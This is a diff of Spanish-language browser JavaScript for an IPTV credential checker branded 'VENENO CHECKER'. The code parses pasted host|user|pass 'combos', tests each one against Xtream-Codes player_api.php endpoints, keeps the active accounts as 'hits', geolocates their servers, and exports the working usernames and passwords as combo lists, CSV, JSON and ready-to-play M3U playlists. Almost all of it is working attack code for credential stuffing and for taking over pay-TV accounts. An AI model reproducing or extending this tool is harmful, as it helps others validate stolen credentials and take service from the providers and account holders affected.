+    const time = new Date().toLocaleTimeString('en-GB',{hour12:false});
+    const div = document.createElement('div');
+    div.className = 'log-line';
+    div.dataset.type = type;
+    if(badge) div.dataset.badge = badge;
+    
+    let c = type==="success"?"text-success":type==="error"?"text-error":type==="warn"?"text-warn":"text-info";
+    
+    let html = `<span class="log-time">[${time}]</span>`;
+    if(badge) {
+        const bClass = badge==="ONLINE" ? "lb-on" : "lb-off";
+        html += `<span class="log-badge ${bClass}">${badge}</span> `;
+    }
+    if(btn) html += `<button class="log-btn" onclick="${btn.onclick}">▶ REPRODUCIR</button> `;
+    html += `<span class="log-msg ${c}">${msg}</span>`;
+    
+    div.innerHTML = html;
+    UI.term.appendChild(div);
+    UI.term.scrollTop = UI.term.scrollHeight;
+    
+    // Actualizar tabla si está visible
+    if (document.getElementById('resultsTableContainer').style.display === 'block') {
+        updateResultsTable();
+    }
+    
+    // Mostrar notificación para eventos importantes - SOLO UNA NOTIFICACIÓN DE HIT A LA VEZ
+    if (type === 'success' && badge === 'ONLINE') {
+        // Extraer solo el nombre del servidor para la notificación
+        const serverName = msg.split('|')[0]?.trim() || msg.split(' ')[0] || 'Servidor';
+        showNotification(`Servidor ONLINE: ${serverName}`, 'success');
+    }
+}
+
+function getFlag(cc) { if(!cc) return ""; return cc.toUpperCase().replace(/./g, c => String.fromCodePoint(c.charCodeAt(0)+127397)); }
+
+function formatTimezone(rawTz) {
+    if (!rawTz) return "Desconocido";
+    const countryInfo = TZ_MAP[rawTz] || "";
+    let displayTz = rawTz.replace(/_/g, " ");
+    if (countryInfo) return `${displayTz} ${countryInfo}`;
+    return displayTz;
+}
+
+// ==================== TEMAS ====================
+function changeTheme(theme) {
+    const root = document.documentElement;
+    switch(theme) {
+        case 'venom':
+            root.style.setProperty('--neon', '#39ff14');
+            root.style.setProperty('--neon-dim', '#0a7a00');
+            root.style.setProperty('--success', '#39ff14');
+            break;
+        case 'toxic':
+            root.style.setProperty('--neon', '#ff00ff');
+            root.style.setProperty('--neon-dim', '#7a007a');
+            root.style.setProperty('--success', '#ff00ff');
+            break;
+        case 'dark':
+            root.style.setProperty('--neon', '#00ff9d');
+            root.style.setProperty('--neon-dim', '#007a4d');
+            root.style.setProperty('--success', '#00ff9d');
+            break;
+        case 'matrix':
+            root.style.setProperty('--neon', '#00ff41');
+            root.style.setProperty('--neon-dim', '#008f11');
+            root.style.setProperty('--success', '#00ff41');
+            root.style.setProperty('--bg', '#0a0a0a');
+            root.style.setProperty('--panel', 'rgba(10, 20, 10, 0.98)');
+            break;
+    }
+    log(`Tema cambiado a: ${theme}`, "success");
+    showNotification(`Tema cambiado a: ${theme}`, 'info');
+}
+
+// ==================== MODO OSCURO ====================
+document.getElementById('btnDarkMode').onclick = function() {
+    darkMode = !darkMode;
+    document.body.style.filter = darkMode ? 'invert(1) hue-rotate(180deg)' : 'none';
+    this.textContent = darkMode ? "☀️ MODO CLARO" : "🌙 MODO OSCURO";
+    log(`Modo oscuro: ${darkMode ? 'ON' : 'OFF'}`, "warn");
+    showNotification(`Modo oscuro ${darkMode ? 'activado' : 'desactivado'}`, 'info');
+};
+
+// ==================== GEO LOCAL VPN ====================
+fetch('https://ipapi.co/json/')
+    .then(r => r.json())
+    .then(d => {
+        const flag = getFlag(d.country_code);
+        clientVPNInfo = `${d.country_name}/${d.city} ${flag} [${d.country_code}]`;
+        setStatus('idle', 'ESPERANDO');
+        log(`Ubicación VPN: ${clientVPNInfo}`, "success");
+        showNotification(`VPN detectada: ${d.country_name}`, 'success');
+        
+        // Actualizar información del servidor
+        document.getElementById('serverName').textContent = d.org || 'Desconocido';
+        document.getElementById('serverVersion').textContent = 'v2.1';
+        document.getElementById('serverPlatform').textContent = navigator.platform;
+        document.getElementById('lastUpdate').textContent = new Date().toLocaleString();
+        document.getElementById('activeUsers').textContent = '1';
+        document.getElementById('serverInfoPanel').style.display = 'block';
+    })
+    .catch(() => {
+        clientVPNInfo = "Desconocido [VPN]";
+        setStatus('idle', 'ESPERANDO');
+        log("No se pudo detectar la ubicación VPN.", "error");
+        showNotification("No se pudo detectar la ubicación VPN", 'warning');
+    });
+
+// ==================== VALIDACIÓN URL ====================
+function isValidM3UUrl(url) {
+    try {
+        const u = new URL(url);
+        const params = u.searchParams;
+        if(!params.get('username') && !params.get('user')) {
+            // Verificar si está en formato de ruta /live/user/pass
+            const pathParts = u.pathname.split('/');
+            if (pathParts.includes('live') && pathParts.length > 3) {
+                return true;
+            }
+            return false;
+        }
+        if(!u.protocol.startsWith('http')) {
+            return false;
+        }
+        return true;
+    } catch {
+        // Verificar si es un combo host|user|pass
+        if (url.includes('|') || url.includes(':')) {
+            return true;
+        }
+        return false;
+    }
+}
+
+// ==================== FILE LOADER ====================
+document.getElementById('fileInput').addEventListener('change', (e) => {
+    const f = e.target.files[0];
+    if(!f) return;
+    const r = new FileReader();
+    r.onload = (ev) => { UI.bulk.value = ev.target.result; log(`Archivo cargado: ${f.name}`, "success"); };
+    r.readAsText(f);
+});
+
+document.getElementById('threadInput').addEventListener('input', e => document.getElementById('threadDisplay').textContent=e.target.value);
+document.getElementById('timeoutInput').addEventListener('input', e => document.getElementById('timeoutDisplay').textContent=e.target.value);
+
+// ==================== LIMPIEZA DE LISTAS ====================
+function cleanM3UList(inputText) {
+    log("Iniciando limpieza de lista...", "info");
+    
+    const lines = inputText.split('\n');
+    const cleanedUrls = [];
+    const patterns = {
+        m3u: /(https?:\/\/[^\s]+\.m3u[^?\s]*)/gi,
+        getPhp: /(https?:\/\/[^\s]+get\.php[^\s]+)/gi,
+        withCredentials: /(https?:\/\/(?:[^\/\s]+\/)+(?:get\.php|live\/|player_api\.php)[^\s]*(?:username|user|pass)=[^\s&]+)/gi,
+        xtream: /(https?:\/\/[^\/\s]+(?::\d+)?\/player_api\.php\?[^\s]+)/gi
+    };
+    
+    lines.forEach(line => {
+        for (const [type, pattern] of Object.entries(patterns)) {
+            const matches = line.match(pattern);
+            if (matches) {
+                matches.forEach(url => {
+                    let cleanUrl = url.trim();
+                    cleanUrl = cleanUrl.replace(/[,\'"\]\[\)\}\{;]+$/, '');
+                    
+                    try {
+                        const urlObj = new URL(cleanUrl);
+                        const params = urlObj.searchParams;
+                        
+                        if (!params.get('username') && !params.get('user')) {
+                            const pathParts = urlObj.pathname.split('/');
+                            const userIndex = pathParts.indexOf('live');
+                            if (userIndex !== -1 && pathParts.length > userIndex + 2) {
+                                const user = pathParts[userIndex + 1];
+                                const pass = pathParts[userIndex + 2];
+                                params.set('username', user);
+                                params.set('password', pass);
+                            }
+                        }
+                        
+                        if (params.get('user') && !params.get('username')) {
+                            params.set('username', params.get('user'));
+                            params.delete('user');
+                        }
+                        
+                        if (params.get('pwd') && !params.get('password')) {
+                            params.set('password', params.get('pwd'));
+                            params.delete('pwd');
+                        }
+                        
+                        cleanUrl = `${urlObj.origin}${urlObj.pathname}?${params.toString()}`;
+                    } catch (e) {
+                        console.warn("Error parsing URL:", cleanUrl);
+                    }
+                    
+                    if (!cleanedUrls.includes(cleanUrl)) {
+                        cleanedUrls.push(cleanUrl);
                     }
                 });
-
-                S.processed += hosts.length;
-                S.reqs += hosts.length;
-            } catch {
-                S.err += hosts.length;
-                S.processed += hosts.length;
-                S.reqs += hosts.length;
             }
-
-            updateUI();
         }
-        S.active--;
-        if (S.active === 0 && !S.q.length && S.run) {
-            stop();
-            alert('ESCÁNER FINALIZADO - ¡HITS GUARDADOS!');
+        
+        const hostMatch = line.match(/^(https?:\/\/[^\/\s]+)/);
+        const userMatch = line.match(/(?:username|user)[=:]([\w\d]+)/i);
+        const passMatch = line.match(/(?:password|pass|pwd)[=:]([\w\d]+)/i);
+        
+        if (hostMatch && userMatch && passMatch) {
+            const host = hostMatch[1];
+            const user = userMatch[1];
+            const pass = passMatch[1];
+            
+            const standardUrl = `${host}/get.php?username=${user}&password=${pass}&type=m3u`;
+            const apiUrl = `${host}/player_api.php?username=${user}&password=${pass}`;
+            
+            if (!cleanedUrls.includes(standardUrl)) cleanedUrls.push(standardUrl);
+            if (!cleanedUrls.includes(apiUrl)) cleanedUrls.push(apiUrl);
         }
-    }
-
-    async function checkAccount(host, username, password) {
-        const ctrl = new AbortController();
-        const timeout = setTimeout(() => ctrl.abort(), 18000);
-
+    });
+    
+    const uniqueUrls = [];
+    const seen = new Set();
+    
+    cleanedUrls.forEach(url => {
         try {
-            const resp = await fetch(`${host}/player_api.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`, {
-                signal: ctrl.signal,
-                headers: { 'Accept': 'application/json' }
-            });
-
-            clearTimeout(timeout);
-            if (!resp.ok) throw new Error('HTTP error');
-
-            const data = await resp.json();
-
-            if (data.user_info?.status === 'Active') {
-                let stats = { live: 0, vod: 0, series: 0, total: 0 };
-
-                let categories = data.categories || data.live_categories || [];
-                if (typeof categories === 'object' && !Array.isArray(categories)) categories = Object.values(categories);
-
-                if (!Array.isArray(categories) || categories.length === 0) {
-                    try {
-                        const [l, v, s] = await Promise.allSettled([
-                            fetch(`${host}/player_api.php?username=${username}&password=${password}&action=get_live_categories`),
-                            fetch(`${host}/player_api.php?username=${username}&password=${password}&action=get_vod_categories`),
-                            fetch(`${host}/player_api.php?username=${username}&password=${password}&action=get_series_categories`)
-                        ]);
-
-                        if (l.status === 'fulfilled' && l.value.ok) stats.live = (await l.value.json()).length || 0;
-                        if (v.status === 'fulfilled' && v.value.ok) stats.vod  = (await v.value.json()).length || 0;
-                        if (s.status === 'fulfilled' && s.value.ok) stats.series = (await s.value.json()).length || 0;
-
-                        stats.total = stats.live + stats.vod + stats.series;
-                    } catch {}
-                } else {
-                    stats.total = categories.length;
-                    stats.live   = categories.filter(c => JSON.stringify(c).toLowerCase().includes('live')).length;
-                    stats.vod    = categories.filter(c => JSON.stringify(c).toLowerCase().match(/movie|vod|film/)).length;
-                    stats.series = categories.filter(c => JSON.stringify(c).toLowerCase().match(/series|serie|tv/)).length;
-                }
-
-                return {
-                    valid: true,
-                    host, username, password,
-                    expires: data.user_info.exp_date ? new Date(data.user_info.exp_date * 1000).toLocaleDateString('es-ES') : '∞ ILIMITADO',
-                    maxconn: data.user_info.max_connections || 1,
-                    stats
-                };
+            const urlObj = new URL(url);
+            const key = `${urlObj.hostname}_${urlObj.searchParams.get('username')}`;
+            if (!seen.has(key)) {
+                seen.add(key);
+                uniqueUrls.push(url);
             }
-            return { valid: false };
         } catch {
-            clearTimeout(timeout);
-            return { valid: false };
+            uniqueUrls.push(url);
+        }
+    });
+    
+    log(`Lista limpiada: ${uniqueUrls.length} URLs válidas encontradas`, "success");
+    showNotification(`Lista limpiada: ${uniqueUrls.length} URLs válidas extraídas`, 'success');
+    
+    return uniqueUrls;
+}
+
+// ==================== EXTRACCIÓN DE COMBOS ====================
+function extractCombos(inputText) {
+    const combos = [];
+    const lines = inputText.split('\n');
+    
+    const comboPatterns = [
+        /([\w.-]+(?::\d+)?)\s*[|:]\s*([\w\d]+)\s*[|:]\s*([\w\d]+)/gi,
+        /(https?:\/\/[\w.-]+(?::\d+)?)\s*[|:]\s*([\w\d]+)\s*[|:]\s*([\w\d]+)/gi,
+        /([\w\d]+):([\w\d]+)@([\w.-]+(?::\d+)?)/gi,
+        /^([\w.-]+)\s+([\w\d]+)\s+([\w\d]+)$/gim
+    ];
+    
+    lines.forEach(line => {
+        for (const pattern of comboPatterns) {
+            const matches = [...line.matchAll(pattern)];
+            matches.forEach(match => {
+                let host, user, pass;
+                
+                if (match[1].includes('://')) {
+                    host = match[1];
+                    user = match[2];
+                    pass = match[3];
+                } else if (match[0].includes('@')) {
+                    user = match[1];
+                    pass = match[2];
+                    host = `http://${match[3]}`;
+                } else {
+                    host = match[1].includes(':') ? `http://${match[1]}` : `http://${match[1]}:80`;
+                    user = match[2];
+                    pass = match[3];
+                }
+                
+                const m3uUrl = `${host}/get.php?username=${user}&password=${pass}&type=m3u`;
+                const apiUrl = `${host}/player_api.php?username=${user}&password=${pass}`;
+                
+                combos.push({
+                    host,
+                    user,
+                    pass,
+                    m3uUrl,
+                    apiUrl,
+                    raw: match[0]
+                });
+            });
+        }
+    });
+    
+    return combos;
+}
+
+function combosToUrls(combos) {
+    return combos.map(combo => combo.m3uUrl);
+}
+
+// ==================== EXPORTACIÓN M3U COMPLETA ====================
+async function exportCompleteM3U() {
+    if (globalHits.length === 0) {
+        showNotification("No hay servidores para exportar", 'warning');
+        return;
+    }
+    
+    showNotification("Generando M3U completo... Esto puede tardar", 'info');
+    
+    let m3uContent = "#EXTM3U\n";
+    let channelCount = 0;
+    
+    const selectedCountry = document.getElementById('countryFilter').value;
+    const filteredHits = selectedCountry === 'all' 
+        ? globalHits 
+        : globalHits.filter(hit => hit.geo.cc === selectedCountry);
+    
+    for (const hit of filteredHits) {
+        try {
+            const m3uUrl = `${hit.host}/get.php?username=${hit.user}&password=${hit.pass}&type=m3u_plus&output=ts`;
+            const response = await fetch(m3uUrl, { 
+                signal: AbortSignal.timeout(10000) 
+            });
+            
+            if (response.ok) {
+                const m3uText = await response.text();
+                const channels = parseM3UContent(m3uText, hit.host);
+                
+                channels.forEach(channel => {
+                    m3uContent += `#EXTINF:-1 tvg-id="${channel.id || ''}" tvg-name="${channel.name}" `
+                                + `tvg-logo="${channel.logo || ''}" group-title="${hit.geo.country || 'General'}", `
+                                + `${channel.name}\n`;
+                    m3uContent += `${channel.url}\n`;
+                    channelCount++;
+                });
+                
+                log(`Servidor ${hit.host}: ${channels.length} canales añadidos`, "success");
+            }
+        } catch (error) {
+            log(`Error al descargar M3U de ${hit.host}: ${error.message}`, "error");
         }
     }
-
-    function updateUI() {
-        E('sTotal').innerText  = S.tot;
-        E('sHits').innerText   = S.hits;
-        E('sErrors').innerText = S.err;
-        E('sRem').innerText    = S.q.length;
-        E('progFill').style.width = S.tot > 0 ? ((S.processed / S.tot) * 100) + '%' : '0%';
+    
+    if (channelCount === 0) {
+        showNotification("No se pudieron extraer canales", 'error');
+        return;
     }
+    
+    const header = `# Generated by VENENO CHECKER & PLAY v2.1\n`
+                 + `# Date: ${new Date().toLocaleString()}\n`
+                 + `# Servers: ${filteredHits.length}\n`
+                 + `# Channels: ${channelCount}\n\n`;
+    
+    m3uContent = header + m3uContent;
+    
+    const blob = new Blob([m3uContent], { type: 'text/plain;charset=utf-8' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `VENENO_COMPLETE_${new Date().toISOString().slice(0,10)}.m3u`;
+    a.click();
+    
+    log(`M3U completo exportado: ${channelCount} canales de ${filteredHits.length} servidores`, "success");
+    showNotification(`M3U exportado con ${channelCount} canales`, 'success');
+}
 
-    function calculateSpeed() {
-        const now = Date.now();
-        E('sSpeed').innerText = Math.round(S.reqs / ((now - S.lastT) / 1000));
-        S.reqs = 0;
-        S.lastT = now;
+function parseM3UContent(m3uText, baseUrl) {
+    const channels = [];
+    const lines = m3uText.split('\n');
+    
+    let currentChannel = null;
+    
+    for (let i = 0; i < lines.length; i++) {
+        const line = lines[i].trim();
+        
+        if (line.startsWith('#EXTINF:')) {
+            const idMatch = line.match(/tvg-id="([^"]*)"/);
+            const nameMatch = line.match(/,(.*)$/);
+            const logoMatch = line.match(/tvg-logo="([^"]*)"/);
+            const groupMatch = line.match(/group-title="([^"]*)"/);
+            
+            currentChannel = {
+                id: idMatch ? idMatch[1] : '',
+                name: nameMatch ? nameMatch[1].trim() : 'Unknown',
+                logo: logoMatch ? logoMatch[1] : '',
+                group: groupMatch ? groupMatch[1] : 'General',
+                url: ''
+            };
+        } else if (currentChannel && line && !line.startsWith('#') && line.includes('://')) {
+            currentChannel.url = line;
+            channels.push({ ...currentChannel });
+            currentChannel = null;
+        } else if (line.startsWith('#EXTM3U')) {
+            continue;
+        }
     }
+    
+    return channels;
+}
 
-    function renderHit(data) {
-        const el = document.createElement('div');
-        el.className = 'hit-card';
+// ==================== EXPORTACIÓN DE COMBOS ====================
+function exportCombos() {
+    if (globalHits.length === 0) {
+        showNotification("No hay datos para exportar", 'warning');
+        return;
+    }
+    
+    let comboContent = "# COMBOS EXPORTADOS - VENENO CHECKER\n";
+    comboContent += "# Format: host|user|pass\n\n";
+    
+    globalHits.forEach((hit, index) => {
+        const host = hit.host.replace(/^https?:\/\//, '');
+        comboContent += `${host}|${hit.user}|${hit.pass}\n`;
+    });
+    
+    const blob = new Blob([comboContent], { type: 'text/plain;charset=utf-8' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `VENENO_COMBOS_${new Date().toISOString().slice(0,10)}.txt`;
+    a.click();
+    
+    log(`Combos exportados: ${globalHits.length} servidores`, "success");
+    showNotification(`Combos exportados: ${globalHits.length} servidores`, 'success');
+}
 
-        const txtToCopy = `HOST: ${data.host}\nUSER: ${data.username}\nPASS: ${data.password}\nEXP: ${data.expires}`;
+// ==================== DETECCIÓN DE PAÍS MEJORADA ====================
+async function detectCountryWithFallback(hostname) {
+    const services = [
+        {
+            name: 'ipapi.co',
+            url: `https://ipapi.co/${hostname}/json/`,
+            parser: data => ({
+                country: data.country_name,
+                code: data.country_code,
+                city: data.city,
+                isp: data.org,
+                ip: data.ip
+            })
+        },
+        {
+            name: 'ip-api.com',
+            url: `http://ip-api.com/json/${hostname}`,
+            parser: data => ({
+                country: data.country,
+                code: data.countryCode,
+                city: data.city,
+                isp: data.isp,
+                ip: data.query
+            })
+        },
+        {
+            name: 'geolocation',
+            url: `https://geolocation-db.com/json/${hostname}`,
+            parser: data => ({
+                country: data.country_name,
+                code: data.country_code,
+                city: data.city,
+                isp: data.ISP,
+                ip: data.IPv4
+            })
+        }
+    ];
+    
+    for (const service of services) {
+        try {
+            const response = await fetch(service.url, { timeout: 5000 });
+            if (response.ok) {
+                const data = await response.json();
+                if (data && data.country) {
+                    const result = service.parser(data);
+                    log(`País detectado (${service.name}): ${result.country}`, "success");
+                    return result;
+                }
+            }
+        } catch (error) {
+            console.log(`Servicio ${service.name} falló:`, error.message);
+        }
+    }
+    
+    const tld = hostname.split('.').pop().toUpperCase();
+    const tldToCountry = {
+        'ES': 'Spain', 'UK': 'United Kingdom', 'DE': 'Germany', 'FR': 'France',
+        'IT': 'Italy', 'PT': 'Portugal', 'BR': 'Brazil', 'US': 'United States',
+        'MX': 'Mexico', 'AR': 'Argentina', 'CO': 'Colombia'
+    };
+    
+    return {
+        country: tldToCountry[tld] || 'Unknown',
+        code: tld in tldToCountry ? tld : '??',
+        city: 'Unknown',
+        isp: 'Unknown',
+        ip: hostname
+    };
+}
 
-        const m3u     = `${data.host}/get.php?username=${data.username}&password=${data.password}&type=m3u_plus`;
-        const m3u_ts  = `${data.host}:80/get.php?username=${data.username}&password=${data.password}&type=m3u_plus&output=ts`;
-        const xmltv   = `${data.host}/xmltv.php?username=${data.username}&password=${data.password}`;
+// ==================== FUNCIÓN DE EXPORTACIÓN CORREGIDA ====================
+function exportSelectedFormat() {
+    const format = document.getElementById('exportFormat').value;
+    
+    // Obtener hits filtrados por país
+    const selectedCountry = document.getElementById('countryFilter').value;
+    const filteredHits = selectedCountry === 'all' 
+        ? globalHits 
+        : globalHits.filter(hit => hit.geo.cc === selectedCountry);
+    
+    if (filteredHits.length === 0) {
+        showNotification("No hay datos para exportar", 'warning');
+        return;
+    }
+    
+    // Crear timestamp para el nombre del archivo
+    const now = new Date();
+    const timestamp = `${now.getFullYear()}-${(now.getMonth()+1).toString().padStart(2,'0')}-${now.getDate().toString().padStart(2,'0')}_${now.getHours().toString().padStart(2,'0')}-${now.getMinutes().toString().padStart(2,'0')}-${now.getSeconds().toString().padStart(2,'0')}`;
+    
+    let content = "";
+    let filename = "";
+    let fileExtension = "";
+    
+    switch(format) {
+        case 'txt':
+            // TXT DETALLADO - CORREGIDO
+            fileExtension = "txt";
+            filename = `VENENO_DETALLADO_${timestamp}.${fileExtension}`;
+            
+            filteredHits.forEach((hit, index) => {
+                const i = hit.info;
+                const s = hit.server;
+                const g = hit.geo;
+                const c = hit.counts;
+                
+                const dateCreated = (t) => t ? new Date(t*1000).toLocaleDateString('es-ES', {day:'numeric', month:'long', year:'numeric'}) : "";
+                const dateExpire = (t) => {
+                    if(!t) return "ILIMITADO";
+                    const dObj = new Date(t*1000);
+                    return dObj.toLocaleDateString('es-ES', {day:'numeric', month:'long', year:'numeric', hour:'2-digit', minute:'2-digit'});
+                };
+                
+                const flag = getFlag(g.cc);
+                const expDate = i.exp_date && i.exp_date != "0" && i.exp_date != null ? dateExpire(i.exp_date) : "ILIMITADO";
+                const activeConnections = i.active_cons || 0;
+                const maxConnections = i.max_connections || 1;
+                
+                content += `━━━━━━━━━━━━━━━━━━━━
+╔═[[ ℍ𝕆𝕊𝕋 𝕀ℕ𝔽𝕆 ]]══════════════⊱
+╠✺ Host: ${hit.host}
+╠✺ Usuario: ${hit.user}
+╠✺ Contraseña: ${hit.pass}
+╠✺ Conexiones: ${activeConnections}/${maxConnections}
+╠✺ Expiración: ${expDate}
+╚═══[[ VENENO CHECKER ]]═══⊱
 
-        el.innerHTML = `
-            <div class="hit-head">
-                <span class="status-badge">VÁLIDO</span>
-                <button class="copy-btn" onclick="navigator.clipboard.writeText(\`${txtToCopy}\`).then(() => {this.innerText='OK'; setTimeout(()=>this.innerText='COPIAR',1200)})">COPIAR</button>
-            </div>
-            <div class="hit-body">
-                <div>
-                    <div class="row"><span class="lbl">HOST:</span> <span class="val">${data.host}</span></div>
-                    <div class="row"><span class="lbl">USUARIO:</span> <span class="val" style="color:var(--neon-purple)">${data.username}</span></div>
-                    <div class="row"><span class="lbl">CONTRASEÑA:</span> <span class="val" style="color:var(--neon-purple)">${data.password}</span></div>
-                </div>
-                <div>
-                    <div class="row"><span class="lbl">CADUCIDAD:</span> <span class="val" style="color:${data.expires==='∞ ILIMITADO'?'var(--neon-green)':'var(--neon-pink)'}">${data.expires}</span></div>
-                    <div class="row"><span class="lbl">CONEXIONES:</span> <span class="val">${data.maxconn}</span></div>
-                </div>
+╔═[[ ℙ𝔸𝕀́𝕊 𝕀ℕ𝔽𝕆 ]]══════════════⊱
+╠✺ País: ${g.country} ${flag}
+╠✺ Ciudad: ${g.city}
+╠✺ ISP: ${g.isp}
+╠✺ IP: ${g.ip}
+╚═══[[ VENENO CHECKER ]]═══⊱
 
-                <div class="categories">
-                    <div class="cat-item"><div class="cat-num">${data.stats.live}</div><div class="cat-label">LIVE</div></div>
-                    <div class="cat-item"><div class="cat-num">${data.stats.vod}</div><div class="cat-label">VOD</div></div>
-                    <div class="cat-item"><div class="cat-num">${data.stats.series}</div><div class="cat-label">SERIES</div></div>
-                </div>
+╔═[[ 𝕄𝔼𝔻𝕀𝔸 𝕀ℕ𝔽𝕆 ]]══════════════⊱
+╠✺ Canales TV: ${c.live}
+╠✺ Películas: ${c.vod}
+╠✺ Series: ${c.series}
+╠✺ Categorías TV: ${c.live_cats}
+╚═══[[ VENENO CHECKER ]]═══⊱
 
-                <div class="links-section">
-                    <span class="lbl">PLAYLIST M3U:</span><a href="${m3u}" target="_blank">${m3u}</a>
-                    <span class="lbl">PLAYLIST M3U8 (TS):</span><a href="${m3u_ts}" target="_blank">${m3u_ts}</a>
-                    <span class="lbl">EPG XMLTV:</span><a href="${xmltv}" target="_blank">${xmltv}</a>
-                </div>
+╔═[[ 𝔼ℕ𝕃𝔸ℂ𝔼𝕊 ]]════════════════⊱
+╠✺ M3U: ${hit.host}/get.php?username=${hit.user}&password=${hit.pass}&type=m3u_plus
+╠✺ API: ${hit.host}/player_api.php?username=${hit.user}&password=${hit.pass}
+╚═══[[ VENENO CHECKER ]]═══⊱
+━━━━━━━━━━━━━━━━━━━━
+
+`;
+            });
+            break;
+            
+        case 'm3u_basic':
+            // M3U BÁSICO
+            fileExtension = "m3u";
+            filename = `VENENO_BASICO_${timestamp}.${fileExtension}`;
+            content = "#EXTM3U\n";
+            filteredHits.forEach(hit => {
+                content += `#EXTINF:-1, ${hit.host} (${hit.geo.country})\n`;
+                content += `${hit.host}/get.php?username=${hit.user}&password=${hit.pass}&type=m3u\n`;
+            });
+            break;
+            
+        case 'm3u_complete':
+            // M3U COMPLETO - Llamar a la función existente
+            exportCompleteM3U();
+            return;
+            
+        case 'json':
+            // JSON
+            fileExtension = "json";
+            filename = `VENENO_JSON_${timestamp}.${fileExtension}`;
+            content = JSON.stringify({
+                generated: new Date().toISOString(),
+                tool: "VENENO CHECKER & PLAY v2.1",
+                hits: filteredHits
+            }, null, 2);
+            break;
+            
+        case 'csv':
+            // CSV
+            fileExtension = "csv";
+            filename = `VENENO_CSV_${timestamp}.${fileExtension}`;
+            content = "Host,Usuario,Contraseña,País,Expiración,Conexiones,Canales,Películas,Series\n";
+            filteredHits.forEach(hit => {
+                const exp = hit.info.exp_date ? new Date(hit.info.exp_date*1000).toLocaleDateString() : "Ilimitado";
+                const activeCons = hit.info.active_cons || 0;
+                const maxCons = hit.info.max_connections || 1;
+                content += `${hit.host},${hit.user},${hit.pass},${hit.geo.country},${exp},${activeCons}/${maxCons},${hit.counts.live},${hit.counts.vod},${hit.counts.series}\n`;
+            });
+            break;
+            
+        case 'combos':
+            // COMBOS
+            fileExtension = "txt";
+            filename = `VENENO_COMBOS_${timestamp}.${fileExtension}`;
+            content = "# COMBOS EXPORTADOS - VENENO CHECKER\n";
+            content += "# Formato: host|usuario|contraseña\n\n";
+            filteredHits.forEach(hit => {
+                const host = hit.host.replace(/^https?:\/\//, '');
+                content += `${host}|${hit.user}|${hit.pass}\n`;
+            });
+            break;
+    }
+    
+    // Crear y descargar el archivo
+    const blob = new Blob(["\uFEFF" + content], {type: "text/plain;charset=utf-8"});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = filename;
+    
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    
+    // Limpiar URL
+    setTimeout(() => URL.revokeObjectURL(url), 100);
+    
+    log(`Exportado como ${format.toUpperCase()}: ${filteredHits.length} servidores`, "success");
+    showNotification(`Archivo ${filename} descargado`, 'success');
+}
+
+// ==================== CONTROLES ====================
+// Clear
+document.getElementById('btnClear').onclick = () => {
+    if(isScanning) return alert("Detén el escaneo primero.");
+    UI.term.innerHTML = ""; UI.bulk.value = ""; globalHits=[];
+    countOnline=0; countOffline=0; countTotal=0;
+    UI.on.textContent="0"; UI.off.textContent="0"; UI.total.textContent="0";
+    UI.fill.style.width="0%"; UI.text.textContent="0/0";
+    if(statsChart) statsChart.destroy();
+    statsChart = null;
+    log("Datos limpiados.", "success");
+    showNotification("Todos los datos han sido limpiados", 'info');
+    updateResultsTable();
+};
+
+// Pause
+document.getElementById('btnPause').onclick = function() {
+    if(!isScanning) return;
+    isPaused = !isPaused;
+    this.textContent = isPaused ? "REANUDAR" : "PAUSAR";
+    this.style.background = isPaused ? "#ffc857" : "";
+    
+    if(isPaused) setStatus('pause', 'PAUSADO');
+    else setStatus('run', 'EJECUTANDO');
+    log(`Escaneo ${isPaused ? 'pausado' : 'reanudado'}`, "warn");
+    showNotification(`Escaneo ${isPaused ? 'pausado' : 'reanudado'}`, isPaused ? 'warning' : 'success');
+};
+
+// Stop
+document.getElementById('btnStop').onclick = () => { 
+    if(isScanning) { 
+        abortScan=true; 
+        setStatus('stop', 'DETENIENDO...');
+        log("Detención solicitada...", "error");
+        showNotification("Deteniendo escaneo...", 'warning');
+    } 
+};
+
+// Help
+document.getElementById('btnHelp').onclick = showHelp;
+
+// Nuevos botones
+document.getElementById('btnCleanList').onclick = function() {
+    const rawText = UI.bulk.value;
+    if (!rawText.trim()) {
+        showNotification("No hay texto para limpiar", 'warning');
+        return;
+    }
+    
+    const cleaned = cleanM3UList(rawText);
+    UI.bulk.value = cleaned.join('\n');
+    
+    const originalLines = rawText.split('\n').length;
+    log(`Limpieza completada: ${originalLines} líneas → ${cleaned.length} URLs limpias`, "success");
+};
+
+document.getElementById('btnExtractCombos').onclick = function() {
+    const rawText = UI.bulk.value;
+    if (!rawText.trim()) {
+        showNotification("No hay texto para extraer combos", 'warning');
+        return;
+    }
+    
+    const combos = extractCombos(rawText);
+    if (combos.length === 0) {
+        showNotification("No se encontraron combos en el texto", 'info');
+        return;
+    }
+    
+    const urls = combosToUrls(combos);
+    UI.bulk.value = urls.join('\n');
+    
+    const stats = combos.reduce((acc, combo) => {
+        const domain = new URL(combo.host).hostname;
+        acc[domain] = (acc[domain] || 0) + 1;
+        return acc;
+    }, {});
+    
+    log(`Extraídos ${combos.length} combos de ${Object.keys(stats).length} dominios diferentes`, "success");
+    showNotification(`${combos.length} combos extraídos y convertidos a URLs`, 'success');
+};
+
+document.getElementById('btnExportCompleteM3U').onclick = exportCompleteM3U;
+document.getElementById('btnExportSelected').onclick = exportSelectedFormat;
+
+// Test de reproducción (básico)
+document.getElementById('btnTestPlayback').onclick = async function() {
+    if (globalHits.length === 0) {
+        showNotification("No hay servidores para probar", 'warning');
+        return;
+    }
+    
+    showNotification("Probando reproducción de servidores...", 'info');
+    log("Iniciando test de reproducción...", "info");
+    
+    let workingCount = 0;
+    
+    for (const hit of globalHits.slice(0, 5)) { // Probar solo los primeros 5
+        try {
+            const testUrl = `${hit.host}/player_api.php?username=${hit.user}&password=${hit.pass}`;
+            const response = await fetch(testUrl, { signal: AbortSignal.timeout(5000) });
+            
+            if (response.ok) {
+                workingCount++;
+                log(`✓ ${hit.host}: Reproducción OK`, "success");
+            }
+        } catch (error) {
+            log(`✗ ${hit.host}: Error en reproducción`, "error");
+        }
+    }
+    
+    showNotification(`Test completado: ${workingCount}/${Math.min(5, globalHits.length)} servidores funcionan`, 'info');
+};
+
+// ==================== SCANNER ====================
+let queue=[], total=0, done=0, active=0;
+let requestCount = 0;
